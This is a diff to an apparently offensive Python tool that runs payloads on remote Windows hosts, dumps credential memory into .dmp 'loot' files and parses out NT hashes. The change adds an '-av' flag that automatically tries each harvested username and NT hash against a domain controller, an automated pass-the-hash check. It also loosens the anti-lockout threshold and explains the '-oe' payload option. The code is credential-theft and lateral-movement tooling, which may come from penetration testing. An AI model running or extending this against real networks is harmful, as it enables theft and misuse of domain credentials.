@@ -1412,6 +1412,7 @@ if __name__ == '__main__':
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-oe', action='store_true', default=False, help='Pause just before the execution of the payload (Good for when you want to execute the payload using other methods)')
     parser.add_argument('-ap', action='store_true', default=False, help='Turn auto parsing of .dmp files ON this will parse the .dmp files into dumped_full.txt, dumped_full_grep.grep, and dumped_msv.txt')
+    parser.add_argument('-av', action='store_true', default=False, help='Turn auto validation of found accounts ON this will try to authenticate to a domain controller using any usernames and NT hashes that were found (Requires -ap)')
     parser.add_argument('-sh', action='store_true', default=False, help='Skips any hosts that have been previously attacked. (Stored in hist file)')
     parser.add_argument('-drive', action='store', help='Set the drive letter for the remote device to connect with')
     parser.add_argument('-threads', action='store', type=int, default=5, help='Set the maximum number of threads default=5')
@@ -1627,7 +1628,7 @@ if __name__ == '__main__':
         if options.drive is None and (options.method == 'wmiexec' or options.method == 'smbexec') and options.oe == False:
             drive_letter = auto_drive(addresses, domain)
 
-        if options.oe:  # I cannot for the life of me remember why this is in here
+        if options.oe:  # This is so that if you are using -oe the payload has an address in the file that it checks for the output naming convention of hotname-ip.dmp otherwise it will error
             addresses = ['23423.5463.1234.3465']
 
         if options.payload == 'msbuild':
@@ -1709,7 +1710,7 @@ if __name__ == '__main__':
             if remove_files.lower() == 'y':
                 os.system('sudo rm {}/loot/{}/*.dmp'.format(cwd, timestamp))
 
-            if input('\nWould you like to autovalidate that any dumped NT hashes are valid? (y/N) ').lower() == 'y':
+            if options.av:
                 printnlog('\n{} Reading dumped_msv.txt'.format(green_plus))
                 try:
                     with open('{}/loot/{}/dumped_msv.txt'.format(cwd, timestamp), 'r') as f:  # read the dumped_msv.txt file into msv_creds
@@ -1735,7 +1736,7 @@ if __name__ == '__main__':
                                     idx_of_2nd_colon = item.find(":", item.find(":") + 1)
                                     username = item[item.find(":") + 1:idx_of_2nd_colon]
                                     nthash = item[idx_of_2nd_colon + 1:-1]
-                                    if acct_chk_fail.count(username) < 3:  # antilockout check
+                                    if acct_chk_fail.count(username) <= 3:  # antilockout check
                                         if username not in acct_chk_valid:  # why try again if we already found a valid set
                                             check_accts(username, None, domain, ip_to_check_against, ip_to_check_against, ':' + nthash, None, False, None, int(445))
                                             tried_full.append(item)
